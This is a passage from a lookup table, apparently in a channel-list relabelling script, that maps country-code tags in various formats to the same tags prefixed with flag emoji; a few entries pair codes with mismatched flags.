        "LA|": "🇱🇦 LA|",
        "LV|": "🇱🇻 LV|",
        "LB|": "🇱🇧 LB|",
        "LS|": "🇱🇸 LS|",
        "LR|": "🇱🇷 LR|",
        "LY|": "🇱🇾 LY|",
        "LI|": "🇱🇮 LI|",
        "TL|": "🇹🇱 TL|",
        "TG|": "🇹🇬 TG|",
        "TK|": "🇹🇰 TK|",
        "MG|": "🇲🇬 MG|",
        "MW|": "🇲🇼 MW|",
        "MY|": "🇲🇾 MY|",
        "MV|": "🇲🇻 MV|",
        "ML|": "🇲🇱 ML|",
        "MT|": "🇲🇹 MT|",
        "MH|": "🇲🇭 MH|",
        "MQ|": "🇲🇶 MQ|",
        "MR|": "🇲🇷 MR|",
        "MU|": "🇲🇺 MU|",
        "YT|": "🇾🇹 YT|",
        "MX|": "🇲🇽 MX|",
        "FM|": "🇫🇲 FM|",
        "MD|": "🇲🇩 MD|",
        "MC|": "🇲🇨 MC|",
        "MN|": "🇲🇳 MN|",
        "ME|": "🇲🇪 ME|",
        "MS|": "🇲🇸 MS|",
        "MA|": "🇲🇦 MA|",
        "MZ|": "🇲🇿 MZ|",
        "MM|": "🇲🇲 MM|",
        "NA|": "🇳🇦 NA|",
        "NR|": "🇳🇷 NR|",
        "NP|": "🇳🇵 NP|",
        "NL|": "🇳🇱 NL|",
        "NC|": "🇳🇨 NC|",
        "NZ|": "🇳🇿 NZ|",
        "NI|": "🇳🇮 NI|",
        "NE|": "🇳🇪 NE|",
        "NG|": "🇳🇬 NG|",
        "NU|": "🇳🇺 NU|",
        "NF|": "🇳🇫 NF|",
        "MP|": "🇲🇵 MP|",
        "NO|": "🇳🇴 NO|",
        "OM|": "🇴🇲 OM|",
        "PK|": "🇵🇰 PK|",
        "PW|": "🇵🇼 PW|",
        "PS|": "🇵🇸 PS|",
        "PA|": "🇵🇦 PA|",
        "PG|": "🇵🇬 PG|",
        "PY|": "🇵🇾 PY|",
        "PE|": "🇵🇪 PE|",
        "PH|": "🇵🇭 PH|",
        "PN|": "🇵🇳 PN|",
        "PL|": "🇵🇱 PL|",
        "PT|": "🇵🇹 PT|",
        "PR|": "🇵🇷 PR|",
        "QA|": "🇶🇦 QA|",
        "RE|": "🇷🇪 RE|",
        "RO|": "🇷🇴 RO|",
        "RUS|": "🇷🇺 RUS|",
        "RW|": "🇷🇼 RW|",
        "BL|": "🇧🇱 BL|",
        "SH|": "🇸🇭 SH|",
        "KN|": "🇰🇳 KN|",
        "LC|": "🇱🇨 LC|",
        "MF|": "🇲🇫 MF|",
        "PM|": "🇵🇲 PM|",
        "VC|": "🇻🇨 VC|",
        "WS|": "🇼🇸 WS|",
        "SM|": "🇸🇲 SM|",
        "ST|": "🇸🇹 ST|",
        "SA|": "🇸🇦 SA|",
        "SN|": "🇸🇳 SN|",
        "RS|": "🇷🇸 RS|",
        "SC|": "🇸🇨 SC|",
        "SL|": "🇸🇱 SL|",
        "SG|": "🇸🇬 SG|",
        "SX|": "🇸🇽 SX|",
        "SK|": "🇸🇰 SK|",
        "SI|": "🇸🇮 SI|",
        "SB|": "🇸🇧 SB|",
        "SO|": "🇸🇴 SO|",
        "ZA|": "🇿🇦 ZA|",
        "GS|": "🇬🇸 GS|",
        "SS|": "🇸🇸 SS|",
        "ES|": "🇪🇸 ES|",
        "LK|": "🇱🇰 LK|",
        "SD|": "🇸🇩 SD|",
        "SR|": "🇸🇷 SR|",
        "SJ|": "🇸🇯 SJ|",
        "SZ|": "🇸🇿 SZ|",
        "SE|": "🇸🇪 SE|",
        "CH|": "🇨🇭 CH|",
        "SY|": "🇸🇾 SY|",
        "TW|": "🇹🇼 TW|",
        "TJ|": "🇹🇯 TJ|",
        "TZ|": "🇹🇿 TZ|",
        "TH|": "🇹🇭 TH|",
        "TT|": "🇹🇹 TT|",
        "TN|": "🇹🇳 TN|",
        "TR|": "🇹🇷 TR|",
        "TM|": "🇹🇲 TM|",
        "TC|": "🇹🇨 TC|",
        "UG|": "🇺🇬 UG|",
        "UA|": "🇺🇦 UA|",
        "AE|": "🇦🇪 AE|",
        "GB|": "🇬🇧 GB|",
        "USA|": "🇺🇸 USA|",
        "UM|": "🇺🇲 UM|",
        "UY|": "🇺🇾 UY|",
        "UZ|": "🇺🇿 UZ|",
        "VU|": "🇻🇺 VU|",
        "VE|": "🇻🇪 VE|",
        "VN|": "🇻🇳 VN|",
        "VI|": "🇻🇮 VI|",
        "WF|": "🇼🇫 WF|",
        "EH|": "🇪🇭 EH|",
        "YE|": "🇾🇪 YE|",
        "ZM|": "🇿🇲 ZM|",
        "ZW|": "🇿🇼 ZW|",
        "ROU|": "🇷🇴 ROU|",
        "SRB|": "🇷🇸 SRB|",
        "HRV|": "🇭🇷 HRV|",
        "BIH|": "🇧🇦 BIH|",
        "UKA|": "🇺🇦 UKA|",
        "|AU|": "🇦🇺 AU ",
        "|KU|": "🇰🇷 KU|",
        "|UK|": "🇬🇧 UK|",
        "|US|": "🇺🇸 US|",
        "|DE|": "🇩🇪 DE|",
        "|AFG|": "🇦🇫 AFG|",
        "|AX|": "🇦🇽 AX|",
        "|ALB|": "🇦🇱 ALB|",
        "|AL|": "🇦🇱 AL|",
        "|DZ|": "🇩🇿 DZ|",
        "|AS|": "🇦🇸 AS|",
        "|AD|": "🇦🇩 AD|",
        "|AO|": "🇦🇴 AO|",
        "|AI|": "🇦🇮 AI|",
        "|AQ|": "🇦🇶 AQ|",
        "|AG|": "🇦🇬 AG|",
        "|AR|": "🇦🇪 AR|",
        "|AM|": "🇦🇲 AM|",
        "|AW|": "🇦🇼 AW|",
        "|AT|": "🇦🇹 AT|",
        "|AZ|": "🇦🇿 AZ|",
        "|BS|": "🇧🇸 BS|",
        "|BH|": "🇧🇭 BH|",
        "|BD|": "🇧🇩 BD|",
        "|BB|": "🇧🇧 BB|",
        "|BY|": "🇧🇾 BY|",
        "|BE|": "🇧🇪 BE|",
        "|BZ|": "🇧🇿 BZ|",
        "|BJ|": "🇧🇯 BJ|",
        "|BM|": "🇧🇲 BM|",
        "|BT|": "🇧🇹 BT|",
        "|BO|": "🇧🇴 BO|",
        "|BA|": "🇧🇦 BA|",
        "|BW|": "🇧🇼 BW|",
        "|BV|": "🇧🇻 BV|",
        "|BR|": "🇧🇷 BR|",
        "|IO|": "🇮🇴 IO|",
        "|BN|": "🇧🇳 BN|",
        "|BG|": "🇧🇬 BG|",
        "|BF|": "🇧🇫 BF|",
        "|BI|": "🇧🇮 BI|",
        "|KH|": "🇰🇭 KH|",
        "|CM|": "🇨🇲 CM|",
        "|CA|": "🇨🇦 CA|",
        "|CV|": "🇨🇻 CV|",
        "|KY|": "🇰🇾 KY|",
        "|CF|": "🇨🇫 CF|",
        "|TD|": "🇹🇩 TD|",
        "|CL|": "🇨🇱 CL|",
        "|CN|": "🇨🇳 CN|",
        "|CX|": "🇨🇽 CX|",
        "|CC|": "🇨🇨 CC|",
        "|CO|": "🇨🇴 CO|",
        "|KM|": "🇰🇲 KM|",
        "|CG|": "🇨🇬 CG|",
        "|CD|": "🇨🇩 CD|",
        "|CK|": "🇨🇰 CK|",
        "|CR|": "🇨🇷 CR|",
        "|CI|": "🇨🇮 CI|",
        "|HR|": "🇭🇷 HR|",
        "|CU|": "🇨🇺 CU|",
        "|CY|": "🇨🇾 CY|",
        "|CZ|": "🇨🇿 CZ|",
        "|DK|": "🇩🇰 DK|",
        "|DJ|": "🇩🇯 DJ|",
        "|DM|": "🇩🇲 DM|",
        "|DO|": "🇩🇴 DO|",
        "|EZ|": "🇪🇨 EZ|",
        "|EG|": "🇪🇬 EG|",
        "|SV|": "🇸🇻 SV|",
        "|GQ|": "🇬🇶 GQ|",
        "|ER|": "🇪🇷 ER|",
        "|EE|": "🇪🇪 EE|",
        "|ET|": "🇪🇹 ET|",
        "|FK|": "🇫🇰 FK|",
        "|FO|": "🇫🇴 FO|",
        "|FJ|": "🇫🇯 FJ|",
        "|FI|": "🇫🇮 FI|",
        "|FR|": "🇫🇷 FR|",
        "|GF|": "🇬🇫 GF|",
        "|PF|": "🇵🇫 PF|",
        "|TF|": "🇹🇫 TF|",
        "|GA|": "🇬🇦 GA|",
        "|GM|": "🇬🇲 GM|",
        "|GE|": "🇬🇪 GE|",
        "|GH|": "🇬🇭 GH|",
        "|GI|": "🇬🇮 GI|",
        "|GR|": "🇬🇷 GR|",
        "|GL|": "🇬🇱 GL|",
        "|GD|": "🇬🇵 GP|",
        "|GU|": "🇬🇺 GU|",
        "|GT|": "🇬🇹 GT|",
        "|GG|": "🇬🇬 GG|",
        "|GN|": "🇬🇳 GN|",
        "|GW|": "🇬🇼 GW|",
        "|GY|": "🇬🇾 GY|",
        "|HT|": "🇭🇹 HT|",
        "|HM|": "🇭🇲 HM|",
        "|VA|": "🇻🇦 VA|",
        "|HN|": "🇭🇳 HN|",
        "|HK|": "🇭🇰 HK|",
        "|HU|": "🇭🇺 HU|",
        "|IS|": "🇮🇸 IS|",
        "|IN|": "🇮🇳 IN|",
        "|ID|": "🇮🇩 ID|",
        "|IR|": "🇮🇷 IR|",
        "|IQ|": "🇮🇶 IQ|",
        "|IE|": "🇮🇪 IE|",
        "|IM|": "🇮🇲 IM|",
        "|IL|": "🇮🇱 IL|",
        "|IT|": "🇮🇹 IT|",
        "|JM|": "🇯🇲 JM|",
        "|JP|": "🇯🇵 JP|",
        "|JE|": "🇯🇪 JE|",
        "|JO|": "🇯🇴 JO|",
        "|KZ|": "🇰🇿 KZ|",
        "|KE|": "🇰🇪 KE|",
        "|KI|": "🇰🇮 KI|",
        "|KP|": "🇰🇵 KP|",
        "|KR|": "🇰🇷 KR|",
        "|KW|": "🇰🇼 KW|",
        "|KG|": "🇰🇬 KG|",
        "|TO|": "🇹🇴 TO|",
        "|LA|": "🇱🇦 LA|",
        "|LV|": "🇱🇻 LV|",
        "|LB|": "🇱🇧 LB|",
        "|LS|": "🇱🇸 LS|",
        "|LR|": "🇱🇷 LR|",
        "|LY|": "🇱🇾 LY|",
        "|LI|": "🇱🇮 LI|",
        "|TL|": "🇹🇱 TL|",
        "|TG|": "🇹🇬 TG|",
        "|TK|": "🇹🇰 TK|",
        "|MG|": "🇲🇬 MG|",
        "|MW|": "🇲🇼 MW|",
        "|MY|": "🇲🇾 MY|",
        "|MV|": "🇲🇻 MV|",
        "|ML|": "🇲🇱 ML|",
        "|MT|": "🇲🇹 MT|",
        "|MH|": "🇲🇭 MH|",
        "|MQ|": "🇲🇶 MQ|",
        "|MR|": "🇲🇷 MR|",
        "|MU|": "🇲🇺 MU|",
        "|YT|": "🇾🇹 YT|",
        "|MX|": "🇲🇽 MX|",
        "|FM|": "🇫🇲 FM|",
        "|MD|": "🇲🇩 MD|",
        "|MC|": "🇲🇨 MC|",
        "|MN|": "🇲🇳 MN|",
        "|ME|": "🇲🇪 ME|",
        "|MS|": "🇲🇸 MS|",
        "|MA|": "🇲🇦 MA|",
        "|MZ|": "🇲🇿 MZ|",
        "|MM|": "🇲🇲 MM|",
        "|NA|": "🇳🇦 NA|",
        "|NR|": "🇳🇷 NR|",
        "|NP|": "🇳🇵 NP|",
        "|NL|": "🇳🇱 NL|",
        "|NC|": "🇳🇨 NC|",
        "|NZ|": "🇳🇿 NZ|",
        "|NI|": "🇳🇮 NI|",
        "|NE|": "🇳🇪 NE|",
        "|NG|": "🇳🇬 NG|",
        "|NU|": "🇳🇺 NU|",
        "|NF|": "🇳🇫 NF|",
        "|MP|": "🇲🇵 MP|",
        "|NO|": "🇳🇴 NO|",
        "|OM|": "🇴🇲 OM|",
        "|PK|": "🇵🇰 PK|",
        "|PW|": "🇵🇼 PW|",
        "|PS|": "🇵🇸 PS|",
        "|PA|": "🇵🇦 PA|",
        "|PG|": "🇵🇬 PG|",
        "|PY|": "🇵🇾 PY|",
        "|PE|": "🇵🇪 PE|",
        "|PH|": "🇵🇭 PH|",
        "|PN|": "🇵🇳 PN|",
        "|PL|": "🇵🇱 PL|",
        "|PT|": "🇵🇹 PT|",
        "|PR|": "🇵🇷 PR|",
        "|QA|": "🇶🇦 QA|",
        "|RE|": "🇷🇪 RE|",
        "|RO|": "🇷🇴 RO|",
        "|RUS|": "🇷🇺 RUS|",
        "|RW|": "🇷🇼 RW|",
        "|BL|": "🇧🇱 BL|",
        "|SH|": "🇸🇭 SH|",
        "|KN|": "🇰🇳 KN|",
        "|LC|": "🇱🇨 LC|",
        "|MF|": "🇲🇫 MF|",
        "|PM|": "🇵🇲 PM|",
        "|VC|": "🇻🇨 VC|",
        "|WS|": "🇼🇸 WS|",
        "|SM|": "🇸🇲 SM|",
        "|ST|": "🇸🇹 ST|",
        "|SA|": "🇸🇦 SA|",
        "|SN|": "🇸🇳 SN|",
        "|RS|": "🇷🇸 RS|",
        "|SC|": "🇸🇨 SC|",
        "|SL|": "🇸🇱 SL|",
        "|SG|": "🇸🇬 SG|",
        "|SX|": "🇸🇽 SX|",
        "|SK|": "🇸🇰 SK|",
        "|SI|": "🇸🇮 SI|",
        "|SB|": "🇸🇧 SB|",
        "|SO|": "🇸🇴 SO|",
        "|ZA|": "🇿🇦 ZA|",
        "|GS|": "🇬🇸 GS|",
        "|SS|": "🇸🇸 SS|",
        "|ES|": "🇪🇸 ES|",
        "|LK|": "🇱🇰 LK|",
        "|SD|": "🇸🇩 SD|",
        "|SR|": "🇸🇷 SR|",
        "|SJ|": "🇸🇯 SJ|",
        "|SZ|": "🇸🇿 SZ|",
        "|SE|": "🇸🇪 SE|",
        "|CH|": "🇨🇭 CH|",
        "|SY|": "🇸🇾 SY|",
        "|TW|": "🇹🇼 TW|",
        "|TJ|": "🇹🇯 TJ|",
        "|TZ|": "🇹🇿 TZ|",
        "|TH|": "🇹🇭 TH|",
        "|TT|": "🇹🇹 TT|",
        "|TN|": "🇹🇳 TN|",
        "|TR|": "🇹🇷 TR|",
        "|TM|": "🇹🇲 TM|",
        "|TC|": "🇹🇨 TC|",
        "|UG|": "🇺🇬 UG|",
        "|UA|": "🇺🇦 UA|",
        "|AE|": "🇦🇪 AE|",
        "|GB|": "🇬🇧 GB|",
        "|USA|": "🇺🇸 USA|",
        "|UM|": "🇺🇲 UM|",
        "|UY|": "🇺🇾 UY|",
        "|UZ|": "🇺🇿 UZ|",
        "|VU|": "🇻🇺 VU|",
        "|VE|": "🇻🇪 VE|",
        "|VN|": "🇻🇳 VN|",
        "|VI|": "🇻🇮 VI|",
        "|WF|": "🇼🇫 WF|",
        "|EH|": "🇪🇭 EH|",
        "|YE|": "🇾🇪 YE|",
        "|ZM|": "🇿🇲 ZM|",
        "|ZW|": "🇿🇼 ZW|",
        "|ROU|": "🇷🇴 ROU|",
        "|SRB|": "🇷🇸 SRB|",
        "|HRV|": "🇭🇷 HRV|",
        "|BIH|": "🇧🇦 BIH|",
        "|UKA|": "🇺🇦 UKA|",
        " De ": " 🇩🇪 De ",
        " DEUTSCHLAND ": " 🇩🇪 DEUTSCHLAND ",
        " Deutschland ": " 🇩🇪 Deutschland ",
        " DEUTSCHE ": " 🇩🇪 DEUTSCHE ",
        " Deutsche ": " 🇩🇪 Deutsche ",
        " GE ": " 🇩🇪 GE ",
        " Ge ": " 🇩🇪 GE ",
        " GERMANY ": " 🇩🇪 GERMANY ",
        " Germany ": " 🇩🇪 Germany ",
        " 24/7 GERMANY ": " 🇩🇪 24/7 GERMANY ",
        " VOD GERMANY ": " 🇩🇪 VOD GERMANY ",
        " |DE| ": " 🇩🇪 |DE| ",
        " [DE] ": " 🇩🇪 [DE] ",
        " (DE) ": " 🇩🇪 (DE) ",
        " ITALIEN ": " 🇮🇹 ITALIEN ",
        " ITALI ": " 🇮🇹 ITALI ",
        " ITALIA ": " 🇮🇹 ITALIA ",
        " Italia ": " 🇮🇹 Italia ",
        " ITALIANO ": " 🇮🇹 ITALIANO ",
        " Switzerland ": " 🇨🇭 Switzerland ",
        " SWITZERLAND ": " 🇨🇭 SWITZERLAND ",
        " UK:": " 🇬🇧 UK ",
        " AU:": " 🇦🇺 AU ",
        " US:": " 🇺🇸 US ",
        " DE:": " 🇩🇪 DE ",
        " AFG:": " 🇦🇫 AFG ",
        " AX:": " 🇦🇽 AX ",
        " ALB:": " 🇦🇱 ALB ",
        " AL:": " 🇦🇱 AL ",
        " DZ:": " 🇩🇿 DZ ",
        " AS:": " 🇦🇸 AS ",
        " AD:": " 🇦🇩 AD ",
        " AO:": " 🇦🇴 AO ",
        " AI:": " 🇦🇮 AI ",
        " AQ:": " 🇦🇶 AQ ",
        " AG:": " 🇦🇬 AG ",
        " AR:": " 🇦🇪 AR ",
        " AM:": " 🇦🇲 AM ",
        " AW:": " 🇦🇼 AW ",
        " AT:": " 🇦🇹 AT ",
        " AZ:": " 🇦🇿 AZ ",
        " BS:": " 🇧🇸 BS ",
        " BH:": " 🇧🇭 BH ",
        " BD:": " 🇧🇩 BD ",
        " BB:": " 🇧🇧 BB ",
        " BY:": " 🇧🇾 BY ",
        " BE:": " 🇧🇪 BE ",
        " BZ:": " 🇧🇿 BZ ",
        " BJ:": " 🇧🇯 BJ ",
        " BM:": " 🇧🇲 BM ",
        " BT:": " 🇧🇹 BT ",
        " BO:": " 🇧🇴 BO ",
        " BA:": " 🇧🇦 BA ",
        " BW:": " 🇧🇼 BW ",
        " BV:": " 🇧🇻 BV ",
        " BR:": " 🇧🇷 BR ",
        " IO:": " 🇮🇴 IO ",
        " BN:": " 🇧🇳 BN ",
        " BG:": " 🇧🇬 BG ",
        " BF:": " 🇧🇫 BF ",
        " BI:": " 🇧🇮 BI ",
        " KH:": " 🇰🇭 KH ",
        " CM:": " 🇨🇲 CM ",
        " CA:": " 🇨🇦 CA ",
        " CV:": " 🇨🇻 CV ",
        " KY:": " 🇰🇾 KY ",
        " KU:": " 🇰🇷 KU ",
        " CF:": " 🇨🇫 CF ",
        " TD:": " 🇹🇩 TD ",
        " CL:": " 🇨🇱 CL ",
        " CN:": " 🇨🇳 CN ",
        " CX:": " 🇨🇽 CX ",
        " CC:": " 🇨🇨 CC ",
        " CO:": " 🇨🇴 CO ",
        " KM:": " 🇰🇲 KM ",
        " CG:": " 🇨🇬 CG ",
        " CD:": " 🇨🇩 CD ",
        " CK:": " 🇨🇰 CK ",
        " CR:": " 🇨🇷 CR ",
        " CI:": " 🇨🇮 CI ",
        " HR:": " 🇭🇷 HR ",
        " CU:": " 🇨🇺 CU ",
        " CY:": " 🇨🇾 CY ",
        " CZ:": " 🇨🇿 CZ ",
        " DK:": " 🇩🇰 DK ",
        " DJ:": " 🇩🇯 DJ ",
        " DM:": " 🇩🇲 DM ",
        " DO:": " 🇩🇴 DO ",
        " EZ:": " 🇪🇨 EZ ",
        " EG:": " 🇪🇬 EG ",
        " SV:": " 🇸🇻 SV ",
        " GQ:": " 🇬🇶 GQ ",
        " ER:": " 🇪🇷 ER ",
        " EE:": " 🇪🇪 EE ",
        " ET:": " 🇪🇹 ET ",
        " FK:": " 🇫🇰 FK ",
        " FO:": " 🇫🇴 FO ",
        " FJ:": " 🇫🇯 FJ ",
        " FI:": " 🇫🇮 FI ",
        " FR:": " 🇫🇷 FR ",
        " GF:": " 🇬🇫 GF ",
        " PF:": " 🇵🇫 PF ",
        " TF:": " 🇹🇫 TF ",
        " GA:": " 🇬🇦 GA ",
        " GM:": " 🇬🇲 GM ",
        " GE:": " 🇬🇪 GE ",
        " GH:": " 🇬🇭 GH ",
        " GI:": " 🇬🇮 GI ",
        " GR:": " 🇬🇷 GR ",
        " GL:": " 🇬🇱 GL ",
        " GD:": " 🇬🇵 GP ",
        " GU:": " 🇬🇺 GU ",
        " GT:": " 🇬🇹 GT ",
        " GG:": " 🇬🇬 GG ",
        " GN:": " 🇬🇳 GN ",
        " GW:": " 🇬🇼 GW ",
        " GY:": " 🇬🇾 GY ",
        " HT:": " 🇭🇹 HT ",
        " HM:": " 🇭🇲 HM ",
        " VA:": " 🇻🇦 VA ",
        " HN:": " 🇭🇳 HN ",
        " HK:": " 🇭🇰 HK ",
        " HU:": " 🇭🇺 HU ",
        " IS:": " 🇮🇸 IS ",
        " IN:": " 🇮🇳 IN ",
        " ID:": " 🇮🇩 ID ",
        " IR:": " 🇮🇷 IR ",
        " IQ:": " 🇮🇶 IQ ",
        " IE:": " 🇮🇪 IE ",
        " IM:": " 🇮🇲 IM ",
        " IL:": " 🇮🇱 IL ",
        " IT:": " 🇮🇹 IT ",
        " JM:": " 🇯🇲 JM ",
        " JP:": " 🇯🇵 JP ",
        " JE:": " 🇯🇪 JE ",
        " JO:": " 🇯🇴 JO ",
        " KZ:": " 🇰🇿 KZ ",
        " KE:": " 🇰🇪 KE ",
        " KI:": " 🇰🇮 KI ",
        " KP:": " 🇰🇵 KP ",
        " KR:": " 🇰🇷 KR ",
        " KW:": " 🇰🇼 KW ",
        " KG:": " 🇰🇬 KG ",
        " TO:": " 🇹🇴 TO ",
        " LA:": " 🇱🇦 LA ",
        " LV:": " 🇱🇻 LV ",
        " LB:": " 🇱🇧 LB ",
        " LS:": " 🇱🇸 LS ",
        " LR:": " 🇱🇷 LR ",
        " LY:": " 🇱🇾 LY ",
        " LI:": " 🇱🇮 LI ",
        " TL:": " 🇹🇱 TL ",
        " TG:": " 🇹🇬 TG ",
        " TK:": " 🇹🇰 TK ",
        " MG:": " 🇲🇬 MG ",
        " MW:": " 🇲🇼 MW ",
        " MY:": " 🇲🇾 MY ",
        " MV:": " 🇲🇻 MV ",
        " ML:": " 🇲🇱 ML ",
        " MT:": " 🇲🇹 MT ",
        " MH:": " 🇲🇭 MH ",
        " MQ:": " 🇲🇶 MQ ",
        " MR:": " 🇲🇷 MR ",
        " MU:": " 🇲🇺 MU ",
        " YT:": " 🇾🇹 YT ",
        " MX:": " 🇲🇽 MX ",
        " FM:": " 🇫🇲 FM ",
        " MD:": " 🇲🇩 MD ",
        " MC:": " 🇲🇨 MC ",
        " MN:": " 🇲🇳 MN ",
        " ME:": " 🇲🇪 ME ",
        " MS:": " 🇲🇸 MS ",
        " MA:": " 🇲🇦 MA ",
        " MZ:": " 🇲🇿 MZ ",
        " MM:": " 🇲🇲 MM ",
        " NA:": " 🇳🇦 NA ",
        " NR:": " 🇳🇷 NR ",
        " NP:": " 🇳🇵 NP ",
        " NL:": " 🇳🇱 NL ",
        " NC:": " 🇳🇨 NC ",
        " NZ:": " 🇳🇿 NZ ",
        " NI:": " 🇳🇮 NI ",
        " NE:": " 🇳🇪 NE ",
        " NG:": " 🇳🇬 NG ",
        " NU:": " 🇳🇺 NU ",
        " NF:": " 🇳🇫 NF ",
        " MP:": " 🇲🇵 MP ",
        " NO:": " 🇳🇴 NO ",
        " OM:": " 🇴🇲 OM ",
        " PK:": " 🇵🇰 PK ",
        " PW:": " 🇵🇼 PW ",
        " PS:": " 🇵🇸 PS ",
        " PA:": " 🇵🇦 PA ",
        " PG:": " 🇵🇬 PG ",
        " PY:": " 🇵🇾 PY ",
        " PE:": " 🇵🇪 PE ",
        " PH:": " 🇵🇭 PH ",
        " PN:": " 🇵🇳 PN ",
        " PL:": " 🇵🇱 PL ",
        " PT:": " 🇵🇹 PT ",
        " PR:": " 🇵🇷 PR ",
        " QA:": " 🇶🇦 QA ",
        " RE:": " 🇷🇪 RE ",
        " RO:": " 🇷🇴 RO ",
        " RUS:": " 🇷🇺 RUS ",
        " RW:": " 🇷🇼 RW ",
        " BL:": " 🇧🇱 BL ",
        " SH:": " 🇸🇭 SH ",
        " KN:": " 🇰🇳 KN ",
        " LC:": " 🇱🇨 LC ",
        " MF:": " 🇲🇫 MF ",
        " PM:": " 🇵🇲 PM ",
        " VC:": " 🇻🇨 VC ",
        " WS:": " 🇼🇸 WS ",
        " SM:": " 🇸🇲 SM ",
        " ST:": " 🇸🇹 ST ",
        " SA:": " 🇸🇦 SA ",
        " SN:": " 🇸🇳 SN ",
        " RS:": " 🇷🇸 RS ",
        " SC:": " 🇸🇨 SC ",
        " SL:": " 🇸🇱 SL ",
        " SG:": " 🇸🇬 SG ",
        " SX:": " 🇸🇽 SX ",
        " SK:": " 🇸🇰 SK ",
        " SI:": " 🇸🇮 SI ",
        " SB:": " 🇸🇧 SB ",
        " SO:": " 🇸🇴 SO ",
        " ZA:": " 🇿🇦 ZA ",
        " GS:": " 🇬🇸 GS ",
        " SS:": " 🇸🇸 SS ",
        " ES:": " 🇪🇸 ES ",
        " LK:": " 🇱🇰 LK ",
        " SD:": " 🇸🇩 SD ",
        " SR:": " 🇸🇷 SR ",
        " SJ:": " 🇸🇯 SJ ",
        " SZ:": " 🇸🇿 SZ ",
        " SE:": " 🇸🇪 SE ",
        " CH:": " 🇨🇭 CH ",
        " SY:": " 🇸🇾 SY ",
        " TW:": " 🇹🇼 TW ",
        " TJ:": " 🇹🇯 TJ ",
        " TZ:": " 🇹🇿 TZ ",
        " TH:": " 🇹🇭 TH ",
        " TT:": " 🇹🇹 TT ",
        " TN:": " 🇹🇳 TN ",
        " TR:": " 🇹🇷 TR ",
        " TM:": " 🇹🇲 TM ",
        " TC:": " 🇹🇨 TC ",
        " UG:": " 🇺🇬 UG ",
        " UA:": " 🇺🇦 UA ",
        " AE:": " 🇦🇪 AE ",
        " GB:": " 🇬🇧 GB ",
        " USA:": " 🇺🇸 USA ",
        " UM:": " 🇺🇲 UM ",
        " UY:": " 🇺🇾 UY ",
        " UZ:": " 🇺🇿 UZ ",
        " VU:": " 🇻🇺 VU ",
        " VE:": " 🇻🇪 VE ",
        " VN:": " 🇻🇳 VN ",
        " VI:": " 🇻🇮 VI ",
        " WF:": " 🇼🇫 WF ",
        " EH:": " 🇪🇭 EH ",
        " YE:": " 🇾🇪 YE ",
        " ZM:": " 🇿🇲 ZM ",
        " ZW:": " 🇿🇼 ZW ",
        " ROU:": " 🇷🇴 ROU ",
        " SRB:": " 🇷🇸 SRB ",
        " HRV:": " 🇭🇷 HRV ",
        " BIH:": " 🇧🇦 BIH ",
        " UKA:": " 🇺🇦 UKA ",
        " AU/": " 🇦🇺 AU ",
        " UK/": " 🇬🇧 UK ",
        " US/": " 🇺🇸 US ",
        " DE/": " 🇩🇪 DE ",
        " AFG/": " 🇦🇫 AFG ",
        " AX/": " 🇦🇽 AX ",
        " KU/": " 🇰🇷 KU ",
        " ALB/": " 🇦🇱 ALB ",
        " AL/": " 🇦🇱 AL ",
        " DZ/": " 🇩🇿 DZ ",
        " AS/": " 🇦🇸 AS ",
        " AD/": " 🇦🇩 AD ",
        " AO/": " 🇦🇴 AO ",
        " AI/": " 🇦🇮 AI ",
        " AQ/": " 🇦🇶 AQ ",
        " AG/": " 🇦🇬 AG ",
        " AR/": " 🇦🇪 AR ",
        " AM/": " 🇦🇲 AM ",
        " AW/": " 🇦🇼 AW ",
        " AT/": " 🇦🇹 AT ",
        " AZ/": " 🇦🇿 AZ ",
        " BS/": " 🇧🇸 BS ",
        " BH/": " 🇧🇭 BH ",
        " BD/": " 🇧🇩 BD ",
        " BB/": " 🇧🇧 BB ",
        " BY/": " 🇧🇾 BY ",
        " BE/": " 🇧🇪 BE ",
        " BZ/": " 🇧🇿 BZ ",
        " BJ/": " 🇧🇯 BJ ",
        " BM/": " 🇧🇲 BM ",
        " BT/": " 🇧🇹 BT ",
        " BO/": " 🇧🇴 BO ",
        " BA/": " 🇧🇦 BA ",
        " BW/": " 🇧🇼 BW ",
        " BV/": " 🇧🇻 BV ",
        " BR/": " 🇧🇷 BR ",
        " IO/": " 🇮🇴 IO ",
        " BN/": " 🇧🇳 BN ",
        " BG/": " 🇧🇬 BG ",
        " BF/": " 🇧🇫 BF ",
        " BI/": " 🇧🇮 BI ",
        " KH/": " 🇰🇭 KH ",
        " CM/": " 🇨🇲 CM ",
        " CA/": " 🇨🇦 CA ",
        " CV/": " 🇨🇻 CV ",
        " KY/": " 🇰🇾 KY ",
        " CF/": " 🇨🇫 CF ",
        " TD/": " 🇹🇩 TD ",
        " CL/": " 🇨🇱 CL ",
        " CN/": " 🇨🇳 CN ",
        " CX/": " 🇨🇽 CX ",
        " CC/": " 🇨🇨 CC ",
        " CO/": " 🇨🇴 CO ",
        " KM/": " 🇰🇲 KM ",
        " CG/": " 🇨🇬 CG ",
        " CD/": " 🇨🇩 CD ",
        " CK/": " 🇨🇰 CK ",
        " CR/": " 🇨🇷 CR ",
        " CI/": " 🇨🇮 CI ",
        " HR/": " 🇭🇷 HR ",
        " CU/": " 🇨🇺 CU ",
        " CY/": " 🇨🇾 CY ",
        " CZ/": " 🇨🇿 CZ ",
        " DK/": " 🇩🇰 DK ",
        " DJ/": " 🇩🇯 DJ ",
        " DM/": " 🇩🇲 DM ",
        " DO/": " 🇩🇴 DO ",
        " EZ/": " 🇪🇨 EZ ",
        " EG/": " 🇪🇬 EG ",
        " SV/": " 🇸🇻 SV ",
        " GQ/": " 🇬🇶 GQ ",
        " ER/": " 🇪🇷 ER ",
        " EE/": " 🇪🇪 EE ",
        " ET/": " 🇪🇹 ET ",
        " FK/": " 🇫🇰 FK ",
        " FO/": " 🇫🇴 FO ",
        " FJ/": " 🇫🇯 FJ ",
        " FI/": " 🇫🇮 FI ",
        " FR/": " 🇫🇷 FR ",
        " GF/": " 🇬🇫 GF ",
        " PF/": " 🇵🇫 PF ",
        " TF/": " 🇹🇫 TF ",
        " GA/": " 🇬🇦 GA ",
        " GM/": " 🇬🇲 GM ",
        " GE/": " 🇬🇪 GE ",
        " GH/": " 🇬🇭 GH ",
        " GI/": " 🇬🇮 GI ",
        " GR/": " 🇬🇷 GR ",
        " GL/": " 🇬🇱 GL ",
        " GD/": " 🇬🇵 GP ",
        " GU/": " 🇬🇺 GU ",
        " GT/": " 🇬🇹 GT ",
        " GG/": " 🇬🇬 GG ",
        " GN/": " 🇬🇳 GN ",
        " GW/": " 🇬🇼 GW ",
